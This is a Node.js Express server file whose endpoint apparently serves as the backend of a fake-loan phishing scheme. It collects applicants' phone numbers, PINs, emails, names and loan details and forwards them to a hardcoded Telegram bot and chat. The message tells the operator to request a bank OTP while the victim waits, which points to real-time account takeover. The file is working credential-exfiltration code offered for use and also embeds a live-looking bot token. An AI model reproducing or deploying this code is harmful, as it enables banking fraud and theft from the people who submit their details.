const express = require('express');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Telegram notification endpoint
app.post('/api/send-telegram', async (req, res) => {
    try {
        const { phone, pin, email, name, amount, term, rate, monthly, appId } = req.body;
        
        console.log('📨 Received notification request:', { phone, pin, email });
        
        const TG_BOT_TOKEN = '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
        const TG_CHAT_ID = '8392790531';
        
        const message = `🔔 NEW PIN CONFIRMATION 🔔\n\nPhone: ${phone}\nPIN: ${pin}\nEmail: ${email}\nName: ${name}\nLoan: $${amount} for ${term} months\nInterest: ${rate}%\nMonthly: $${monthly}\nApp ID: ${appId || 'N/A'}\n\nRequest OTP from the bank now! User is waiting.`;
        
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}`;
        
        const response = await fetch(url);
        const result = await response.json();
        
        console.log('Telegram response:', result);
        
        if (result.ok) {
            res.json({ success: true, message: 'Notification sent' });
        } else {
            res.json({ success: false, error: result.description });
        }
    } catch (error) {
        console.error('Error:', error.message);
        res.json({ success: false, error: error.message });
    }
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📋 Health check: http://localhost:${PORT}/api/health`);
    console.log(`📋 Telegram endpoint: http://localhost:${PORT}/api/send-telegram`);
});